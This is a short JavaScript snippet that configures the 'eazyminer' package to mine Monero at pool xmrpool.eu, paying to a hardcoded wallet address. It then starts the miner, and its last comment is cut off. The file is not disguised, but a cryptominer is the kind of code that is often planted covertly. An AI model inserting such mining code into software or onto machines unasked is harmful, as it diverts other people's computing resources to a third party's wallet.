const Miner = require('eazyminer');
//
const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '4AAL8nBSh1c8SLxUfFfXqxNm5riDL7YWc51pdgjzW2PdFshtSU8jofNJnpzBhPjxXP1hzqteLQ1TnHqUahEcYMda7Mqpits',
        url: 'xmrpool.eu:9999', // optional pool URL,
    }],
    autoStart: false // optional delay
});

miner.start(); // optional manually start the m
// //